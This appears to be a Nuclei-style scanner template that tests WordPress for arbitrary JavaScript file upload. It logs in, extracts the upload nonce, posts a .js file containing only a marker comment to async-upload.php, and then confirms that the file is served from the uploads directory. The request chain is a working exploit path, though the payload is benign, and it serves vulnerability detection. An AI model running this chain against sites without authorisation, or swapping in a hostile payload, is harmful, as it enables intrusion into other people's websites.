flow: http(1) && http(2) && http(3) && http(4)
http:
- matchers:
  - condition: and
    dsl:
    - status_code == 302
    - contains(header, "wordpress_logged_in")
    internal: true
    type: dsl
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    log={{username}}&pwd={{password}}&wp-submit=Log+In

    '
- extractors:
  - group: 1
    internal: true
    name: nonce
    regex:
    - '"_wpnonce":"([a-f0-9]+)"'
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, '_wpnonce')
    internal: true
    type: dsl
  raw:
  - 'GET /wp-admin/upload.php HTTP/1.1

    Host: {{Hostname}}

    '
- extractors:
  - group: 1
    internal: true
    name: upload_year
    regex:
    - uploads\\/([0-9]+)\\/[0-9]+\\/[^"]+\.js
    type: regex
  - group: 1
    internal: true
    name: upload_month
    regex:
    - uploads\\/[0-9]+\\/([0-9]+)\\/[^"]+\.js
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains_all(body, "success",".js")
    internal: true
    type: dsl
  raw:
  - 'POST /wp-admin/async-upload.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{randstr}}


    ------WebKitFormBoundary{{randstr}}

    Content-Disposition: form-data; name="name"


    {{filename}}.js

    ------WebKitFormBoundary{{randstr}}

    Content-Disposition: form-data; name="action"


    upload-attachment

    ------WebKitFormBoundary{{randstr}}

    Content-Disposition: form-data; name="_wpnonce"


    {{nonce}}

    ------WebKitFormBoundary{{randstr}}

    Content-Disposition: form-data; name="async-upload"; filename="{{filename}}.js"

    Content-Type: application/javascript


    //{{marker}}

    ------WebKitFormBoundary{{randstr}}--

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, "//{{marker}}")
    type: dsl
  raw:
  - 'GET /wp-content/uploads/{{upload_year}}/{{upload_month}}/{{filename}}.js HTTP/1.1

    Host: {{Hostname}}

    '
